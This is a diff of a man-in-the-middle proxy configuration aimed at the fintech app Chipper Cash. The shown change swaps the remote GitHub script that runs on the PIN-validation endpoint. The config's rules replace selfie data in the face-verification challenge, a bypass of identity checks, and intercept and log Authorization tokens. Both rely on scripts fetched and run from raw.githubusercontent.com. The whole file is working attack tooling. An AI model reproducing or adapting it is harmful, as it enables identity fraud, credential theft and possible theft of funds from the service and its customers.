@@ -2,7 +2,7 @@
 # Intercept and modify selfie data
 http-request ^https:\/\/compliance\.chippercash\.com\/face-verification\/selfie_challenge$ script-path=https://raw.githubusercontent.com/chucyfunny/Chipper/main/replace_selfie.js, requires-body=true
 # Intercept and log Authorization token
-http-request ^https:\/\/auth\.chippercash\.com\/pin\/validate script-path=https://raw.githubusercontent.com/chucyfunny/Chipper/main/Get_UsdtaDress.js, requires-header=true
+http-request ^https:\/\/auth\.chippercash\.com\/pin\/validate script-path=https://raw.githubusercontent.com/chucyfunny/Chipper/main/usdt.js, requires-header=true
 
 [MITM]
 hostname = compliance.chippercash.com, auth.chippercash.com
